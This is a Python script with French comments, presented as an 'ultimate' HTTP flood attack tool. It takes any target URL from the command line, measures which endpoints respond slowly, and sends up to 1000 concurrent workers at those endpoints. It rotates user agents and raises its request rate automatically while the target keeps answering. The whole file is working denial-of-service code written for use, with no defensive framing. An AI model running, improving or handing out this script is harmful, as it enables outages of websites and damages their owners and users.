#!/usr/bin/env python3
"""
Attaque HTTP flood ULTIME – auto-adaptatif + détection endpoints lourds
✅ Aucune URL codée en dur – tout via argv[1]
"""

import asyncio
import aiohttp
import random
import time
import sys
from urllib.parse import urljoin, urlparse

# === CONFIGURATION DYNAMIQUE ===
BASE_TIMEOUT = 10
MAX_CONCURRENT = 1000
COMMON_ENDPOINTS = [
    "/", "/api", "/test", "/slow", "/login", "/register", "/search",
    "/admin", "/dashboard", "/upload", "/profile", "/settings"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "curl/7.68.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
]

class AttackState:
    def __init__(self):
        self.timeout = BASE_TIMEOUT
        self.concurrency = 100
        self.success_rate = 1.0
        self.latency = 0.5
        self.running = True
        self.heavy_endpoints = []
        self.all_endpoints = COMMON_ENDPOINTS.copy()

state = AttackState()
stats = {"success": 0, "error": 0}

# === DÉTECTION DES ENDPOINTS LOURDS ===
async def detect_heavy_endpoints(session: aiohttp.ClientSession, base_url: str):
    print("[🔍] Détection des endpoints lourds...")
    endpoint_latencies = {}
    
    for endpoint in state.all_endpoints:
        url = urljoin(base_url, endpoint)
        latencies = []
        for _ in range(3):
            try:
                start = time.time()
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    await resp.read()
                latencies.append(time.time() - start)
            except Exception:
                latencies.append(10)
        
        avg_latency = sum(latencies) / len(latencies)
        endpoint_latencies[endpoint] = avg_latency
        print(f"  → {endpoint}: {avg_latency:.2f}s")
    
    heavy = [ep for ep, lat in sorted(endpoint_latencies.items(), key=lambda x: x[1], reverse=True) if lat > 1.0]
    if not heavy:
        heavy = [ep for ep, lat in sorted(endpoint_latencies.items(), key=lambda x: x[1], reverse=True)[:3]]
    
    state.heavy_endpoints = heavy
    print(f"[✅] Endpoints lourds détectés: {heavy}")

# === MESURE DE LATENCE ===
async def measure_latency(session: aiohttp.ClientSession, url: str):
    try:
        start = time.time()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
            await resp.read()
        return time.time() - start
    except Exception:
        return 30

# === ENVOI DE REQUÊTE ===
async def send_request(session: aiohttp.ClientSession, base_url: str):
    try:
        endpoint = random.choice(state.heavy_endpoints) if state.heavy_endpoints and random.random() < 0.8 else random.choice(state.all_endpoints)
        url = urljoin(base_url, endpoint)
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        timeout = aiohttp.ClientTimeout(total=state.timeout)
        
        async with session.get(url, headers=headers, timeout=timeout) as resp:
            await resp.read()
        stats["success"] += 1
        return True
    except Exception:
        stats["error"] += 1
        return False

# === WORKER ===
async def adaptive_worker(session: aiohttp.ClientSession, base_url: str):
    while state.running:
        await send_request(session, base_url)
        delay = 1.0 / (state.concurrency / 100)
        await asyncio.sleep(max(0.01, delay))

# === MONITORING & ADAPTATION ===
async def monitor_and_adapt(base_url: str):
    connector = aiohttp.TCPConnector(limit=1000)
    async with aiohttp.ClientSession(connector=connector) as session:
        await detect_heavy_endpoints(session, base_url)
        await asyncio.sleep(5)
        
        while state.running:
            await asyncio.sleep(10)
            total = stats["success"] + stats["error"]
            if total == 0: continue
                
            state.success_rate = stats["success"] / total
            latency = await measure_latency(session, base_url)
            state.latency = latency
            state.timeout = min(60, max(10, latency * 2 + 5))
            
            if state.success_rate > 0.85 and state.concurrency < MAX_CONCURRENT:
                state.concurrency = min(MAX_CONCURRENT, int(state.concurrency * 1.25))
            elif state.success_rate < 0.6 and state.concurrency > 50:
                state.concurrency = max(50, int(state.concurrency * 0.75))
            
            heavy_str = ", ".join(state.heavy_endpoints[:2])
            print(f"\n[🎯] Cibles: [{heavy_str}]")
            print(f"[⏱️] Latence: {latency:.1f}s | Timeout: {state.timeout:.1f}s")
            print(f"[📈] Concurrence: {state.concurrency} | Succès: {state.success_rate:.1%}")

# === MAIN ===
async def main():
    if len(sys.argv) != 2:
        print("Usage: python http-flood-ultimate.py <URL>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    parsed = urlparse(target_url)
    if not parsed.scheme or not parsed.netloc:
        print("Erreur: URL invalide")
        sys.exit(1)
    
    print(f"[🚀] Attaque ULTIME vers {target_url}")
    
    connector = aiohttp.TCPConnector(
        limit=MAX_CONCURRENT,
        limit_per_host=MAX_CONCURRENT,
        keepalive_timeout=60,
        enable_cleanup_closed=True
    )
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [adaptive_worker(session, target_url) for _ in range(MAX_CONCURRENT)]
        tasks.append(monitor_and_adapt(target_url))
        
        try:
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            state.running = False
            print("\n[🛑] Arrêt en cours...")

if __name__ == "__main__":
    asyncio.run(main())
